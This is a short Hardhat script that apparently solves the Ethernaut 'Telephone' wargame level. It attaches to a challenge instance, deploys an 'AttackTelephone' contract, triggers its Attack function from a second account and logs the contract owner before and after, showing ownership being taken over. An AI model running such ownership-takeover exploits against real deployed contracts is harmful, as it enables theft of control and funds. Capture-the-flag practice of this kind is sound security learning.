const hre = require("hardhat");

async function main() {
  const [, otherAccount] = await ethers.getSigners();
  const TelephoneContract = await hre.ethers.getContractFactory("Telephone");
  // attach your instance address
  const Instance = "0x452682C0c3712d59eFA15E69bbBe9FD3C2B74A77";
  const Telephone = TelephoneContract.attach(Instance);
  const AttackContract = await ethers.getContractFactory("AttackTelephone");
  const Attack = await AttackContract.deploy(Instance);
  await Attack.deployed();
  const owner = await Telephone.owner();
  console.log("Attacking...");
  await Attack.connect(otherAccount).Attack();
  const newOwner = await Telephone.owner();

  console.log(owner, newOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
